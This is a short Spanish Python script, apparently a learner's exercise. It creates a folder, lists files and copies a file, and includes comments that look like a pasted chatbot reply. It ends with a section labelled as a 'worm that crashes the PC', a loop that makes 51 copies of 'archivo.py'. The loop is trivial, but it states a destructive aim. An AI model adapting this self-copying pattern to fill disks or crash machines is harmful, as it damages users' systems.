import os
import shutil

# Obtener la ubicacion de trabajo actual
print(os.getcwd())

# Pedir el nombre de la carpeta a crear
carpeta = input("Ingrese el nombre de la carpeta que desea crear (presione Enter para omitir): ")

# Verificar si se ingresó un nombre de carpeta
if carpeta != "":
    # Verificar si la carpeta ya existe
    if not os.path.exists(carpeta):
        # Crear la carpeta si no existe
        os.mkdir(carpeta)
        print("Carpeta creada exitosamente.")
    else:
        print(f"La carpeta '{carpeta}' ya existe.")
else:
    print("Se ha omitido la creación de la carpeta.")

# Listar archivos disponibles
print("Archivos disponibles en la carpeta actual:")
for archivo in os.listdir():
    print(archivo)

# Pedir el nombre del archivo a copiar
archivo_original = input("Ingrese el nombre del archivo que desea copiar (presione Enter para omitir): ")
if archivo_original != "":
    archivo_copia = input("Ingrese el nombre que desea para la copia del archivo: ")
    # SHUTIL (copiar y pegar archivos)
    shutil.copy2(archivo_original, archivo_copia) 
    print("Archivo copiado exitosamente.")
else:
    print("Se ha omitido la copia del archivo.")

# En este código, se verifica si el usuario ingresó un nombre de archivo antes de pedir el nombre de la copia y realizar la copia. Si el usuario omite el nombre del archivo original, se mostrará un mensaje correspondiente y se omitirá la copia.

# ¡Espero que esto te haya ayudado! Avísame si tienes alguna otra pregunta o necesitas más ayuda.

# GUSANO EN PYTHON QUE COLAPSE LA PC

contador = 0

while contador <= 50:
    shutil.copy2("archivo.py", f"script-gusano{str(contador)}.py")
    contador += 1